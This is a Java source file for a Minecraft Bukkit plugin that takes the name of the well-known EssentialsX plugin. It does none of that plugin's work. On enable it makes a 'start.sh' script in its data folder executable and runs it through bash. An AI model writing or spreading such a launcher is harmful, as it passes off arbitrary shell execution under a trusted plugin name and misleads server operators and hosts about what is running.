package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {

    private Process process;
    private volatile boolean isProcessRunning = false;

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        try {
            startScript();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start start.sh: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void startScript() throws Exception {
        if (isProcessRunning) {
            return;
        }

        Path pluginDir = getDataFolder().toPath();

        if (!Files.exists(pluginDir)) {
            Files.createDirectories(pluginDir);
        }

        Path startScript = pluginDir.resolve("start.sh");

        if (!Files.exists(startScript)) {
            throw new IOException("start.sh not found: " + startScript.toAbsolutePath());
        }

        startScript.toFile().setExecutable(true);

        ProcessBuilder pb = new ProcessBuilder("bash", "./start.sh");
        pb.directory(pluginDir.toFile());

        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        process = pb.start();
        isProcessRunning = true;

        startProcessMonitor();
    }

    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = process.waitFor();
                isProcessRunning = false;
                getLogger().info("EssentialsX plugin exited with code: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "StartScript-Process-Monitor");

        monitorThread.setDaemon(true);
        monitorThread.start();
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");

        if (process != null && process.isAlive()) {
            process.destroy();

            try {
                if (!process.waitFor(10, TimeUnit.SECONDS)) {
                    process.destroyForcibly();
                    getLogger().warning("Forcibly terminated EssentialsX plugin");
                } else {
                    getLogger().info("EssentialsX plugin stopped normally");
                }
            } catch (InterruptedException e) {
                process.destroyForcibly();
                Thread.currentThread().interrupt();
            }

            isProcessRunning = false;
        }

        getLogger().info("EssentialsX plugin disabled");
    }
}
